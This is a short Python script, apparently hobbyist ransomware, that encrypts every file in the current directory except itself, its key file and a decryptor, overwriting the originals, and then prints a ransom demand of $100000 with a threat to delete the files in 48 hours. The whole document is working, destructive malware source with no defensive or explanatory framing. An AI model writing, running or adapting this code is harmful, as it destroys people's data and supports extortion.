#!/usr/bin/env python3 


import os 
from cryptography.fernet import Fernet 

#lets do some digging 


files = []


for file in  os.listdir():
	if file == "snowden.py" or file == "keyhehe.key" or file == "decryptt.py":
		continue 
	if os.path.isfile(file):
	 	files.append(file)
print(files)


key = Fernet.generate_key()

with open("keyhehe.key", "wb") as keyhehe:
	keyhehe.write(key)

for file in files:
	with open(file, "rb") as filehehe:
		contents = filehehe.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as filehehe:
		filehehe.write(contents_encrypted)

print("ALL OF YOUR FILES HAVE BEEN ENCRPTED SEND ME 100000$ OR I'LL DELETE THEM IN 48HRS")
